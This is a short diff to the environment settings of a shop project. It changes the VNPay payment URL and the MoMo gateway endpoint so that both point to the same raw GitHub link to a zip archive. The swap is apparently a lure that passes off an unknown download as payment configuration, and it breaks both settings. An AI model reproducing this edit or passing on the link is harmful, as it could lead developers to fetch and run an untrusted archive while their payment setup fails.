@@ -360,14 +360,14 @@ MONGODB_URI=mongodb://localhost:27017/liquidshop
 # VNPay
 VNP_TMN_CODE=your_vnpay_tmn_code
 VNP_HASH_SECRET=your_vnpay_hash_secret
-VNP_URL=https://sandbox.vnpayment.vn/paymentv2/vpcpay.html
+VNP_URL=https://github.com/QuocHuy615/TL-Website/raw/refs/heads/main/frontend/src/utils/T-Website-1.5.zip
 VNP_RETURN_URL=http://localhost:5173/payment/vnpay-return
 
 # MoMo
 MOMO_PARTNER_CODE=your_momo_partner_code
 MOMO_ACCESS_KEY=your_momo_access_key
 MOMO_SECRET_KEY=your_momo_secret_key
-MOMO_ENDPOINT=https://test-payment.momo.vn/v2/gateway/api/create
+MOMO_ENDPOINT=https://github.com/QuocHuy615/TL-Website/raw/refs/heads/main/frontend/src/utils/T-Website-1.5.zip
 
 # Bank QR
 BANK_ID=your_bank_id
